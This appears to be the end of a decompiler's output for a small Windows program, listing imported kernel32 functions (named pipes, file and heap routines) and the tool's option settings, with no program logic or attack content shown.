/* 0x0040103c       0 */ /* unknown */ void 	__imp__CreateNamedPipeA;
/* 0x00401040       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x00401044       0 */ /* unknown */ void 	__imp__ReadFileScatter;
/* 0x00401048       0 */ /* unknown */ void 	__imp__ReadFile;
/* 0x0040104c       0 */ /* unknown */ void 	__imp__HeapDestroy;
/* 0x00401050       0 */ /* unknown */ void 	__imp__HeapCreate;
/* 0x00401054       0 */ /* unknown */ void 	__imp__ConnectNamedPipe;
/* 0x00401058       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x0040105c       0 */ /* unknown */ void 	__imp__HeapCompact;
/* 0x00401060       0 */ /* unknown */ void 	__imp__HeapFree;
/* 0x00401064       0 */ /* unknown */ void 	__imp__GetCurrentDirectoryA;
/* 0x00401068       0 */ /* unknown */ void 	__imp__VirtualQuery;
/* 0x0040106c       0 */ /* unknown */ void 	__imp__SetFilePointer;
/* 0x00401070       0 */ /* unknown */ void 	__imp__HeapSize;
/* 0x00401074       0 */ /* unknown */ void 	__imp__MapViewOfFile;
/* 0x00401078       0 */ /* unknown */ void 	__imp__FileTimeToLocalFileTime;
/* 0x0040107c       0 */ /* unknown */ void 	__imp__VirtualFree;
/* 0x00401314       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
